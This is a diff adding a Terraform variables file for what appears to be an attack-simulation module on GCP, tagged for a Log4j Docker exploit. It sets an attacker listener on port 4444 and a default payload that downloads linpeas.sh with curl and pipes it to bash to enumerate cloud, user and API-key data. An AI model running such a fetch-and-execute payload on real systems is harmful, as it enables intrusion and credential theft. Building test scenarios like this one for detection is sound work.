@@ -1,0 +1,65 @@
+variable "environment" {
+    type = string
+    description = "name of the environment"
+}
+
+variable "deployment" {
+    type = string
+    description = "unique deployment id"
+}
+
+variable "gcp_location" {
+    type = string
+}
+
+variable "gcp_project_id" {
+    type    = string
+}
+
+variable "tag" {
+    type = string
+    default = "osconfig_exec_docker_exploit_log4j"
+}
+
+variable "timeout" {
+    type = string
+    default = "600s"
+}
+
+variable "listen_ip" {
+  type = string
+  description = "IP address of attacker"
+  default = "0.0.0.0"
+}
+
+variable "listen_port" {
+  type = number
+  description = "Port address of attacker"
+  default = 4444
+}
+
+variable "payload" {
+  type = string
+  description = "The bash commands payload to execute when target machine connects"
+  default = <<-EOT
+            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
+            EOT
+}
+
+variable "attack_delay" {
+  type = number
+  description = "wait time between baseline and attack (default: 12 hours)"
+  default =  50400
+}
+
+variable "iam2rds_role_name" {
+  type = string
+  description = "The default role name to use for the iam2rds attack"
+  default = "rds_user_access_role_ciemdemo"
+}
+
+variable "iam2rds_session_name" {
+  type = string
+  description = "The default role name to use for the iam2rds attack"
+  default = "attacker-session"
+}
